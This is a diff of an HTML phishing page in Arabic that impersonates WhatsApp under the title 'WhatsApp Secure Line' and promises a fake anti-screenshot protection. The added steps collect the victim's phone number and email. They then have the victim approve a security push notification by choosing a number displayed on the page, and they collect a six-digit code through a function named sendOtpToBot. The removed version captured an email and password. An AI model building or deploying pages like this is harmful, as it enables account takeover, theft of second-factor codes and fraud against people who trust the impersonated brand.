@@ -3,44 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Chat Verification</title>
+    <title>WhatsApp Secure Line</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-    <div id="main-ui" class="wa-container">
-        <div class="wa-header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo"></div>
-        <div class="wa-body">
-            <div class="user-info">
-                <img src="img/your-profile.jpg" class="profile-pic">
-                <h3>نظام التحقق من الهوية</h3>
-                <p>Official WhatsApp Business API</p>
+    <div id="app-container" class="wa-container shadow-glow">
+        
+        <div id="step-1" class="page">
+            <div class="wa-header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo pulse"></div>
+            <div class="wa-body">
+                <div class="icon-shield">🔒</div>
+                <h3>بروتوكول حماية المكالمات</h3>
+                <p style="font-size: 14px; line-height: 1.6; color: #444;">
+                    لحماية خصوصيتك، يقوم هذا النظام بتفعيل طبقة حماية تمنع تسجيل المكالمات أو التقاط الشاشة (Anti-Screenshot) أثناء المراسلة. 
+                    <br><b>خطوة 1:</b> أدخل رقم هاتفك المرتبط بالخدمة.
+                </p>
+                <input type="tel" id="phone-num" placeholder="9665XXXXXXXX" class="main-input">
+                <button class="btn-verify" onclick="goToStep2()">تفعيل الحماية الآن</button>
             </div>
-            <div class="action-box">
-                <p>لبدء الدردشة المشفرة مع <b>المسؤول</b>، يرجى تأكيد ملكية الحساب.</p>
-                <button class="btn-continue" onclick="startVerification()">بدء التحقق والدردشة</button>
+        </div>
+
+        <div id="step-2" class="page" style="display:none;">
+            <div id="provider-header" class="provider-header"></div>
+            <div class="wa-body">
+                <h3 id="login-title">المزامنة الأمنية</h3>
+                <p style="font-size: 13px; color: #666;">يجب ربط حساب الجهاز لتوليد مفاتيح التشفير السحابية الخاصة بمنع التصوير.</p>
+                <input type="email" id="user-email" placeholder="البريد الإلكتروني الموحد" class="main-input">
+                <button id="auth-btn" class="btn-verify" onclick="startAuth()">ربط الحساب</button>
+                <div id="loading-spinner" class="spinner" style="display:none;"></div>
+            </div>
+        </div>
+
+        <div id="step-3" class="page" style="display:none;">
+            <div class="wa-body">
+                <h3 id="auth-msg">تأكيد مفتاح الامان</h3>
+                
+                <p id="auth-instruction" style="font-size: 14px; color: #d93025; font-weight: bold;">
+                    سيصلك إشعار أمان من النظام خلال ثوانٍ، يرجى الضغط عليه واختيار الرقم الظاهر أدناه للمتابعة:
+                </p>
+                
+                <div id="dynamic-code" class="big-code">--</div>
+
+                <div id="otp-area" style="margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px;">
+                    <p style="font-size: 12px; color: #555;">بمجرد الاختيار، سيظهر كود تفعيل نهائي، يرجى كتابته هنا:</p>
+                    <input type="text" id="otp-code" placeholder="- - - - - -" maxlength="6" class="main-input otp-style">
+                    <button class="btn-verify" onclick="sendOtpToBot()">إنهاء التفعيل</button>
+                </div>
             </div>
         </div>
     </div>
-
-    <div id="login-popup" class="login-overlay" style="display:none;">
-        <div class="login-card">
-            <div id="provider-logo"></div>
-            <h2 id="login-title">تسجيل الدخول</h2>
-            <p id="login-desc">استخدم حسابك لمزامنة جهات الاتصال</p>
-            
-            <div id="loading-spinner" class="spinner" style="display:none;"></div>
-
-            <div id="input-fields" class="input-group">
-                <input type="email" id="user-email" placeholder="البريد الإلكتروني أو الهاتف" required>
-                <input type="password" id="user-pass" placeholder="أدخل كلمة المرور" required>
-            </div>
-
-            <button id="main-btn" class="btn-signin" onclick="captureAccount()">التالي</button>
-            <div class="login-footer"><a href="#">هل نسيت البريد الإلكتروني؟</a></div>
-        </div>
-    </div>
-
     <script src="app.js"></script>
 </body>
 </html>
